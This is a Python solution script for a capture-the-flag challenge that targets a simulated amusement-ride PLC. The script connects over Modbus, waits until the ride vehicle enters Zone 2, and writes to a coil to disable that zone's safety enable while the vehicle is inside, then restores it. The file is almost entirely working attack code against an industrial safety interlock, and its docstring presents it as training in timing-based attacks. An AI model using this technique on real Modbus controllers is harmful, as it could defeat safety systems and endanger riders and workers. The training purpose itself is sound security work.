#!/usr/bin/env python3
"""
Challenge 04: Zone Lockout (200 points)
Difficulty: Easy

Objective: Use Modbus to disable Zone 2 (Main Show Sequence) while the vehicle
is moving through it.

Requirements:
- Ride must be running (state = 2)
- Vehicle must be in Zone 2 (positions 9-17)
- Disable zone_2_enable via Modbus (coil 6)
- Must be direct Modbus write, not UI control

Educational Value:
- Understand zone-based ride control
- Learn about maintenance isolation systems
- Practice timing-based attacks
"""

from pymodbus.client import ModbusTcpClient
import time

PLC_HOST = 'localhost'
MAIN_PLC_PORT = 502

def disable_zone_2():
    """
    Disable Zone 2 while vehicle is inside
    """
    print("=" * 60)
    print("Challenge 04: Zone Lockout")
    print("=" * 60)
    print()

    client = ModbusTcpClient(PLC_HOST, port=MAIN_PLC_PORT)

    if not client.connect():
        print("✗ Failed to connect to Main PLC")
        return False

    print(f"✓ Connected to Main PLC at {PLC_HOST}:{MAIN_PLC_PORT}")
    print()

    # Check if ride is running
    result = client.read_holding_registers(2, 1, slave=1)
    if result.isError():
        print("✗ Failed to read ride state")
        client.close()
        return False

    state = result.registers[0]
    state_names = ['Idle', 'Starting', 'Running', 'Stopping', 'Emergency']
    print(f"Current State: {state} ({state_names[state] if state < len(state_names) else 'Unknown'})")

    if state != 2:
        print()
        print("⚠️  Ride is not running!")
        print("   Start the ride first, then run this script.")
        client.close()
        return False

    print()
    print("Monitoring vehicle position...")
    print("Waiting for Zone 2 entry (Main Show Sequence)...")
    print("Zone 2 spans positions 9-17")
    print()

    # Wait for vehicle to enter Zone 2
    zone_2_entered = False
    for i in range(150):
        result = client.read_holding_registers(1, 1, slave=1)
        if not result.isError():
            position = result.registers[0]

            # Check if in Zone 2 (positions 9-17)
            if 9 <= position <= 17 and not zone_2_entered:
                zone_2_entered = True
                print(f"✓ Vehicle entered Zone 2 at position {position}")
                print()
                print("Executing attack...")
                print("  → Writing FALSE to zone_2_enable (coil 6)")

                # Disable Zone 2
                result = client.write_coil(6, False, slave=1)
                if not result.isError():
                    print("  ✓ Zone 2 disabled successfully!")
                    print()
                    print("⚠️  Zone 2 is now disabled while vehicle is inside!")
                    print("   This violates zone lockout safety rules.")
                    print()
                    print("🎯 Challenge 04 should now be completed!")
                    print("   Check the CTF dashboard to verify.")

                    # Re-enable zone after a moment
                    time.sleep(2)
                    print()
                    print("Re-enabling Zone 2 to restore normal operation...")
                    client.write_coil(6, True, slave=1)
                    print("✓ Zone 2 re-enabled")

                    client.close()
                    return True
                else:
                    print("  ✗ Failed to write coil")
                    client.close()
                    return False

        time.sleep(0.5)

    print()
    print("✗ Timeout waiting for vehicle to enter Zone 2")
    print("  Make sure the ride is running and try again")

    client.close()
    return False

if __name__ == "__main__":
    try:
        disable_zone_2()
    except KeyboardInterrupt:
        print("\n\n✗ Attack interrupted by user")
    except Exception as e:
        print(f"\n✗ Attack failed: {e}")
